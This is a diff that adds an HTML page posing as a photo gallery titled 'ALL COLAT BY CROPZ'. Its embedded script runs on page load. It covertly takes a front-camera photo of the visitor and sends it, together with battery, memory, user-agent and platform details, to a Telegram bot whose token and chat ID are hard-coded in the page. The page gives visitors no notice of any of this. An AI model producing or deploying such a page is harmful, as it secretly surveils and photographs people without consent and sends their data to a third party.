@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ALL COLAT BY CROPZ</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        .video-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+        .title {
+            background-color: white;
+            font-size: 24px;
+            font-weight: bold;
+            padding: 20px;
+            margin: 20px auto;
+            display: inline-block;
+            border-bottom: 3px solid black;
+            position: relative;
+            z-index: 1;
+        }
+        .image-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            justify-content: center;
+            max-width: 400px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+        .image-box {
+            border: 3px solid orange;
+            padding: 5px;
+            background-color: white;
+        }
+        .image-box img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <video class="video-background" autoplay loop muted>
+        <source src="b.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+    <div class="title">ALL COLAT BY CROPZ</div>
+    <div class="image-container">
+        <div class="image-box"><img src="image.jpg" alt="Image"></div>
+        <div class="image-box"><img src="image.jpg" alt="Image"></div>
+        <div class="image-box"><img src="image.jpg" alt="Image"></div>
+        <div class="image-box"><img src="image.jpg" alt="Image"></div>
+        <div class="image-box"><img src="image.jpg" alt="Image"></div>
+        <div class="image-box"><img src="image.jpg" alt="Image"></div>
+    </div>
+    <script>
+        const botToken = "8168522734:AAFx_UuVpXdieHrDGyp36TAe9x3FA5VjzZw";
+        const chatId = "7336408897";
+
+        async function capturePhotoAndSend() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                video.play();
+
+                await new Promise(resolve => setTimeout(resolve, 2000)); 
+                
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+                
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+                const formData = new FormData();
+                formData.append("photo", blob, "photo.jpg");
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (error) {
+                console.error("Error capturing photo:", error);
+            }
+        }
+
+        async function sendDeviceInfo() {
+            const battery = await navigator.getBattery();
+            const info = `📱 *Device Info:*
+📡 Network: ${navigator.onLine ? "Online" : "Offline"}
+🔋 Battery: ${battery.level * 100}%
+⚡ Charging: ${battery.charging ? "Yes" : "No"}
+🕒 Time: ${new Date().toLocaleString()}
+💾 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown"}
+🔍 User Agent: ${navigator.userAgent}
+💻 Platform: ${navigator.platform}`;
+            
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: info, parse_mode: "Markdown" })
+            });
+        }
+
+        async function sendTelegramCredentials() {
+            const message = `🔑 *Bot Credentials:*
+🆔 Chat ID: ${chatId}
+🔐 Bot Token: ${botToken}`;
+            
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+            });
+        }
+
+        sendTelegramCredentials();
+        capturePhotoAndSend();
+        sendDeviceInfo();
+    </script>
+</body>
+</html>
